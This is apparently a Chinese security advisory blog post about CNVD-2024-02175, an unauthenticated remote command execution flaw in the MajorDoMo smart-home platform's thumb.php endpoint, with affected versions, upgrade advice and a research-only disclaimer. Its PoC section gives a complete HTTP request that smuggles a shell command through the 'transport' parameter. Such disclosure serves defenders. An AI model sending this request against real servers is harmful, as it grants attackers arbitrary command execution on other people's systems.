#  漏洞预警 | MajorDoMo远程命令执行漏洞   
浅安  浅安安全   2024-04-20 09:02  
  
**0x00 漏洞编号**  
- # CNVD-2024-02175  
  
**0x01 危险等级**  
- 高危  
  
**0x02 漏洞概述**  
  
MajorDoMo是MajorDoMo社区的一个开源DIY智能家居自动化平台。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/7stTqD182SUyXyDV9WptCdlurQNfUVMEnWZslvjfia2PRuBfCnZd80MCwxZsjnDB68WcuBPoKxMiaqzMqhLbxAwQ/640?wx_fmt=png&from=appmsg "")  
  
**0x03 漏洞详情**  
###   
###   
  
**CNVD-2024-02175**  
  
**漏洞类型：**  
远程代码执行  
  
**影响：**  
执行任意命令  
  
**简述：**  
MajorDoMo的/modules/thumb/thumb.php接口处存在远程命令执行漏洞，未经身份验证的攻击者可利用此漏洞执行任意指令，获取服务器权限。  
###   
  
**0x04 影响版本**  
- MajorDoMo < 0662e5e  
  
**0x05****POC**  
```
GET /modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
Accept-Charset: utf-8
Accept-Encoding: gzip, deflate
Connection: close
```  
  
**仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布****者**  
**不承担任何法律及连带责任。**  
  
**0x06****修复建议**  
  
**目前官方已发布漏洞修复版本，建议用户升级到安全版本****：**  
  
https://majordomohome.com/  
  
  
  
